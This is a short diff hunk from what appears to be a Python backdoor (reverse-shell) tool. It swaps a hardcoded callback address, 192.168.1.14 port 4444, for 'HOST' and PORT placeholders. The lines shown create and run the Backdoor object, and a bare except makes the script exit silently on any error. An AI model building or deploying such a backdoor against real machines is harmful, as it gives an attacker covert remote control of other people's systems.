@@ -153,7 +153,7 @@ class Backdoor:
             print('\nConnection finished')
 
 try: 
-    backdoor = Backdoor('192.168.1.14', 4444) # CHANGE HOST AND PORT HERE!
+    backdoor = Backdoor('HOST', PORT) # CHANGE HOST AND PORT HERE!
     backdoor.run()
 except:
     sys.exit()
